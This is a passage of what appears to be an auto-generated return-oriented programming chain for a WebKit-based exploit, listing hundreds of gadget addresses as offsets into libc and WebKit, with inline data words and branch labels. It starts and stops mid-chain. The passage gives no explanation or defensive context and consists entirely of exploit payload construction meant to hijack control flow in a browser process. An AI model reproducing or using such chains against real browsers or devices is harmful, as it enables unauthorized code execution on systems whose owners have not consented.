libc_base+793877 //pop rsi
]);
//L3181:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3182:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+200376, //L3184
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3183:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+200448, //L3186
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3185:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3186:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+200520, //L3188
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3187:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3188:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+200592, //L3190
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3189:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3190:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+200664, //L3192
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3191:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3192:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3193:
db([4294967257, 4294967295]); // -0x27
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+200760, //L3196
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3195:
db([2, 0]); // 0x2
set_gadget(libc_base+788575,); //pop rax
//L3196:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3197:
db([4294967258, 4294967295]); // -0x26
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+200848, //L3199
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3199:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3201:
db([15395, 0]); // 0x3c23
set_gadgets([
libc_base+562536, //mov [rdi], cx
libc_base+793877, //pop rsi
ropchain+200920, //L3202
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L3202:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3203:
db([4294967260, 4294967295]); // -0x24
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+201000, //L3206
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3205:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3206:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+201048, //L3207
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3207:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3208:
db([16, 0]); // 0x10
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+201160, //L3210
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3209:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+788575,); //pop rax
//L3210:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+201248, //L3211
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3211:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3212:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+201352, //L3214
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+201368, //L3215
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3214:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3215:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+201520, //L3217
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+201552, //L3220
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+201536, //L3218
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+201504, //L3219
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3219:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3217:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3218:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3220:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+201648, //L3222
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+201632, //L3221
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3221:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3222:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3224:
ropchain+201752, //L3223
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+215360, //L3225
//L3223:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575 //pop rax
]);
//L3226:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+201872, //L3227
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3227:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3228:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+201976, //L3230
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+201992, //L3231
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3230:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3231:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+202144, //L3233
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+202176, //L3236
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+202160, //L3234
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+202128, //L3235
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3235:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3233:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3234:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3236:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+202272, //L3238
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+202256, //L3237
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3237:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3238:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3240:
ropchain+202376, //L3239
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+219344, //L3241
//L3239:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575 //pop rax
]);
//L3242:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L3243:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+202544, //L3244
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3244:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3245:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+202648, //L3247
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+202664, //L3248
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3247:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3248:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+202816, //L3250
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+202848, //L3253
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+202832, //L3251
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+202800, //L3252
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3252:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3250:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3251:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3253:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+202944, //L3255
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+202928, //L3254
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3254:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3255:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3257:
ropchain+203048, //L3256
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+218016, //L3258
//L3256:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+203184, //L3259
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+203200, //L3261
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+203168, //L3260
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3260:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3259:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3261:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+203304, //L3263
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+203288, //L3262
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L3262:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3263:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3264:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3266:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3267:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+203464, //L3269
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+203480, //L3270
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3269:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3270:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+203584, //L3273
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+203568, //L3272
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L3272:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3273:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3274:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3276:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3277:
db([4294967244, 4294967295]); // -0x34
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+203720, //L3280
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3279:
db([131072, 0]); // 0x20000
set_gadget(libc_base+788575,); //pop rax
//L3280:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+203776, //L3283
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3283:
db([0, 0]); // 0x0
//L3281:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+203824, //L3284
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3284:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3285:
db([4294967244, 4294967295]); // -0x34
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+203928, //L3287
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+203944, //L3288
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3287:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3288:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+204096, //L3290
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+204128, //L3293
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+204112, //L3291
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+204080, //L3292
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3292:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3290:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3291:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3293:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+204200, //L3294
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+204216, //L3295
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3294:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3295:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+204320, //L3299
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+204368, //L3300
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+204336, //L3297
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3299:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3297:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3298:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3300:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+204480, //L3301+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+204472, //L3301
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L3301:
db([0, 0]); // 0x0
set_gadgets([
ropchain+204496, //L3301+24
ropchain+209760, //L3296
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3303:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+792472,); //pop rcx
//L3304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+204616, //L3305
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+204632, //L3306
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3305:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3306:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+204784, //L3308
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+204816, //L3311
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+204800, //L3309
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+204768, //L3310
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3310:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3308:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3309:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3311:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+204888, //L3312
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+204904, //L3313
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3312:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3313:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+205000, //L3315
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+204984, //L3314
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3314:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3315:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+205080, //L3316
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3316:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3317:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+205184, //L3319
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+205200, //L3320
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3319:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3320:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+205344, //L3324
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+205312, //L3322
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+205328, //L3323
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3322:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3323:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3324:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+205424, //L3325
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3325:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3326:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+205528, //L3328
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+205544, //L3329
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3328:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3329:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+205696, //L3331
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+205728, //L3334
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+205712, //L3332
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+205680, //L3333
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3333:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3331:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3332:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3334:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+205824, //L3336
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+205808, //L3335
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3335:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3336:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3338:
ropchain+205928, //L3337
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+216688, //L3339
//L3337:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+206000, //L3340
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3340:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3341:
db([4294967240, 4294967295]); // -0x38
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3343:
db([4294967240, 4294967295]); // -0x38
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+206144, //L3345
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+206160, //L3346
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3345:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3346:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+206312, //L3348
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+206344, //L3351
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+206328, //L3349
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+206296, //L3350
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3350:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3348:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3349:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3351:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+206416, //L3352
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+206432, //L3353
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3352:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3353:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+206528, //L3355
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
